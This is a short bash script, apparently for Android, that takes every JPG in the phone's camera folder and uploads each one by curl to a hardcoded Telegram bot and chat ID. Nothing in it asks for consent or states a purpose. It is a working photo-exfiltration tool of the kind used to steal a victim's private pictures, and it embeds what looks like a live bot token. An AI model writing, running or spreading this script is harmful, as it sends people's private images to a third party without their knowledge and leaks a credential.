#!/bin/bash


bot_token="6109398302:AAF27C--NPfFLtlcvTeT66u9rdn3nmLw7kA"
chat_id="1538488453"


image_files=(/sdcard/DCIM/Camera/*.jpg)

for image in "${image_files[@]}"
do
   curl -s -X POST "https://api.telegram.org/bot${bot_token}/sendPhoto" \
   -F chat_id="${chat_id}" \
   -F photo="@${image}"
done

